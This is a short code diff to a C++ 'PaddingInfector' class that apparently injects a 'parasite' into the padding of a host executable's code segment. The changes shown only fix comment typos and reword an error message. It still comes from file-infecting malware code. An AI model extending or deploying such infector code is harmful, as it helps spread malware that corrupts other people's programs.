@@ -91,10 +91,10 @@ bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
         // next segment is not loadable to result in a code cave, or if we see
         // another executable segment, the binary probably uses a custom linker
         // script that we can't reasonably inject with certainty. Bail out to
-        // avoid curropting it.
+        // avoid corrupting it.
         return false;
       }
-      // Return padding_size (maximum size of parasite that host can accomodate
+      // Return padding_size (maximum size of parasite that host can accommodate
       // in its padding between the end of CODE segment and start of next
       // loadable segment)
 
@@ -124,9 +124,8 @@ std::optional<InjectionResult> PaddingInfector::inject(
     std::span<std::byte> host_mapping,
     std::span<const std::byte> parasite_mapping) {
   if (padding_size_ < parasite_mapping.size()) {
-    vt::printf(STR_LITERAL(
-                   "Host cannot accomodate parasite padding size: %%d parasite "
-                   "size:%%d\n"),
+    vt::printf(STR_LITERAL("Host cannot fit parasite padding: %%d parasite "
+                           "size:%%d\n"),
                padding_size_, parasite_mapping.size());
     return std::nullopt;
   }
